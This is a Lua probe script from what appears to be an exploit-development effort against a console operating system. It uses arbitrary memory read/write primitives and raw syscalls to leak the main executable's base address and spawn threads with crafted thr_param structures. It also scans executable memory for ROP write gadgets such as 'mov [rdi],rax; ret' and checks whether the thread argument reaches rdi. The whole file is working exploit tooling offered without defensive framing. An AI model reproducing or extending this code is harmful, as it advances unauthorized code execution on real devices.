-- CRASH_CLASS: MODERATE
-- PROBE 56l: thr_new(455) with real struct thr_param — minimal test

print("=== PROBE 56l: THR_NEW REAL ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end
local function fmt(val)
    if val == nil then return "nil" end
    local h, l
    if type(val) == "table" and val.h then h = val.h; l = val.l
    else h = 0; l = N(val) end
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end

local stub = syscall.pipe.fn_addr
local pid_val = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid_val)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid_val end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local tlo = rd(N(ib) + 0x108) or 0
local thi = rd(N(ib) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
print(string.format("eboot=0x%X%08X", thi, tlo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", thi, tlo + off))
end

local sc455 = mk(455)
local sc433 = mk(433)
local sc_mmap = mk(477)

-- ============ A: jmp$ park — known to work from 383a ============
print("")
print("--- A: thr_new with jmp$ (park) ---")

local stack1 = sc_mmap(uint64(0), uint64(0x10000), uint64(3),
    uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
local tid_p = memory.alloc(8)
wq(tid_p, uint64(0))

local p1 = memory.alloc(0x40)
for i = 0, 0x3C, 4 do wd(N(p1) + i, 0) end
wq(p1, eaddr(0x15481))                          -- start_func = jmp$
wq(uint64(N(p1) + 0x08), uint64(0x42424242))    -- arg
wq(uint64(N(p1) + 0x10), uint64(N(stack1)))     -- stack_base
wq(uint64(N(p1) + 0x18), uint64(0x10000))       -- stack_size
wq(uint64(N(p1) + 0x30), uint64(N(tid_p)))      -- child_tid

local ok1, ret1 = pcall(function()
    return sc455(uint64(N(p1)), uint64(0x38))
end)
print("  ret=" .. (ok1 and tostring(N(ret1)) or "FAIL"))

local x = 0; for k = 1, 60000 do x = x + k end

local tid1 = rq(tid_p)
print("  child_tid=" .. fmt(tid1))

if tid1 then
    local tn = N(tid1)
    if tn > 0 then
        local ok3, rv3 = pcall(function() return sc433(uint64(tn), uint64(0)) end)
        print("  thr_kill(child,0)=" .. (ok3 and tostring(N(rv3)) or "FAIL"))
    end
end
print("  alive=" .. tostring(alive()))

if not alive() then print("DEAD"); return end

-- ============ B: Find write gadget in 1.5MB of eboot ============
print("")
print("--- B: scan 1.5MB for write gadgets ---")

local wg = nil
local wg_type = nil
local SCAN = 0x180000
for off = 0, SCAN - 8, 4 do
    local dw = rd(tlo + off)
    if dw then
        -- aligned: 48 89 07 C3 = mov [rdi],rax;ret
        if dw == 0xC3078948 then
            wg = off; wg_type = "mov_rdi_rax_aligned"
            print(string.format("  mov[rdi],rax;ret ALIGNED at eboot+0x%X", off))
            break
        end
        -- aligned: 89 07 C3 xx = mov [rdi],eax;ret (32-bit)
        if (dw % 0x1000000) == 0xC30789 then
            wg = off; wg_type = "mov_rdi_eax_aligned"
            print(string.format("  mov[rdi],eax;ret at eboot+0x%X", off))
            break
        end
        local dw2 = rd(tlo + off + 4)
        if dw2 then
            local b0 = dw % 256
            local b1 = math.floor(dw / 256) % 256
            local b2 = math.floor(dw / 65536) % 256
            local b3 = math.floor(dw / 16777216) % 256
            local b4 = dw2 % 256
            local b5 = math.floor(dw2 / 256) % 256
            -- +1: xx 48 89 07 C3
            if b1 == 0x48 and b2 == 0x89 and b3 == 0x07 and b4 == 0xC3 then
                wg = off + 1; wg_type = "mov_rdi_rax_p1"
                print(string.format("  mov[rdi],rax;ret at eboot+0x%X", wg))
                break
            end
            -- +2: xx xx 48 89 07 C3
            if b2 == 0x48 and b3 == 0x89 and b4 == 0x07 and b5 == 0xC3 then
                wg = off + 2; wg_type = "mov_rdi_rax_p2"
                print(string.format("  mov[rdi],rax;ret at eboot+0x%X", wg))
                break
            end
            -- +3: xx xx xx 48 89 07 C3
            local b6 = math.floor(dw2 / 65536) % 256
            if b3 == 0x48 and b4 == 0x89 and b5 == 0x07 and b6 == 0xC3 then
                wg = off + 3; wg_type = "mov_rdi_rax_p3"
                print(string.format("  mov[rdi],rax;ret at eboot+0x%X", wg))
                break
            end
            -- +1: xx 89 07 C3 = mov [rdi],eax;ret (unaligned)
            if b1 == 0x89 and b2 == 0x07 and b3 == 0xC3 then
                if not wg then
                    wg = off + 1; wg_type = "mov_rdi_eax_p1"
                    print(string.format("  mov[rdi],eax;ret at eboot+0x%X (backup)", wg))
                end
            end
        end
    end
    if off % 0x40000 == 0 and off > 0 then
        print(string.format("  scanned 0x%X...", off))
    end
end
if not wg then print("  NOT FOUND in 1.5MB") end

if wg then
    print("")
    print("--- C: arg delivery test ---")

    local marker_page = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local ma = N(marker_page)
    wd(ma, 0xDEAD0003)
    wd(ma + 4, 0xCAFE0001)
    local blo = rd(ma) or 0
    local bhi = rd(ma + 4) or 0
    print(string.format("  marker_addr=0x%X", ma))
    print(string.format("  before: lo=0x%08X hi=0x%08X", blo, bhi))

    print("  C1: alloc stack")
    local stack2 = sc_mmap(uint64(0), uint64(0x10000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local s2a = N(stack2)
    -- RSP = stack_base + stack_size. Use 0xF000 so RSP is inside mapping.
    -- Write jmp$ at [RSP] so ret lands in jmp$ loop instead of crashing.
    local stk_sz = 0xF000
    wq(uint64(s2a + stk_sz), eaddr(0x15481))       -- ret address -> jmp$
    wq(uint64(s2a + stk_sz + 8), eaddr(0x15481))   -- backup
    wq(uint64(s2a + stk_sz + 16), eaddr(0x15481))  -- backup

    print("  C2: build param")
    local tid_p2 = memory.alloc(8)
    wq(tid_p2, uint64(0))

    local p2 = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(p2) + i, 0) end
    wq(p2, eaddr(wg))                              -- start_func = mov [rdi],rax;ret
    wq(uint64(N(p2) + 0x08), uint64(ma))           -- arg = marker address
    wq(uint64(N(p2) + 0x10), uint64(s2a))          -- stack_base
    wq(uint64(N(p2) + 0x18), uint64(stk_sz))       -- stack_size (0xF000)
    wq(uint64(N(p2) + 0x30), uint64(N(tid_p2)))    -- child_tid

    print("  C3: calling thr_new")
    local ok2, ret2 = pcall(function()
        return sc455(uint64(N(p2)), uint64(0x38))
    end)
    local rv2 = ok2 and N(ret2) or -999
    print("  C4: ret=" .. rv2)

    x = 0; for k = 1, 200000 do x = x + k end

    print("  C5: reading tid")
    local tp = N(tid_p2)
    local t2lo = rd(tp)
    local t2hi = rd(tp + 4)
    print("  tid=" .. tostring(t2lo) .. "/" .. tostring(t2hi))

    print("  C6: reading marker")
    local alo = rd(ma)
    local ahi = rd(ma + 4)
    print("  m_lo=" .. tostring(alo) .. " m_hi=" .. tostring(ahi))

    local bef_lo = rd(ma) or 0
    if bef_lo == -559038461 or bef_lo == 0xDEAD0003 then
        print("  VERDICT: UNCHANGED — arg not in rdi or rax=sentinel")
    else
        print("  VERDICT: *** CHANGED *** arg in rdi confirmed!")
    end
else
    print("  write gadget not found")
end

print("")
print("canary=" .. (alive() and "OK" or "FAIL"))
print("=== 56l COMPLETE ===")
